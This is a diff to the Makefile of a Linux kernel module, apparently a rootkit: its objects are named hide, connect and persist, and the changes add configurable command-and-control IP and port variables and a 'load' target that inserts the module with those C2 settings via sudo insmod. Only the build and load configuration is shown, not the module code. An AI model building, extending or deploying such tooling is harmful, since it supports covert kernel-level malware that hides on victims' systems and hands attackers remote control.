@@ -2,8 +2,15 @@ obj-m += wlkom.o
 
 wlkom-objs := main.o hide.o connect.o persist.o
 
+ccflags-y := -Wno-declaration-after-statement \
+	         -Wno-error=incompatible-pointer-types \
+	         -Wno-incompatible-pointer-types
+
 KDIR := /lib/modules/$(shell uname -r)/build
-PWD := $(shell pwd)
+PWD  := $(shell pwd)
+
+C2_IP   ?= 192.168.100.1
+C2_PORT ?= 4444
 
 all:
 	@if [ ! -d "$(KDIR)" ]; then \
@@ -18,7 +25,9 @@ clean:
 	make -C $(KDIR) M=$(PWD) clean
 
 load:
-	sudo insmod wlkom.ko c2_ip="192.168.1.1" c2_port=4444
+	sudo insmod wlkom.ko c2_ip="$(C2_IP)" c2_port=$(C2_PORT)
 
 unload:
 	sudo rmmod wlkom
+
+.PHONY: all clean load unload
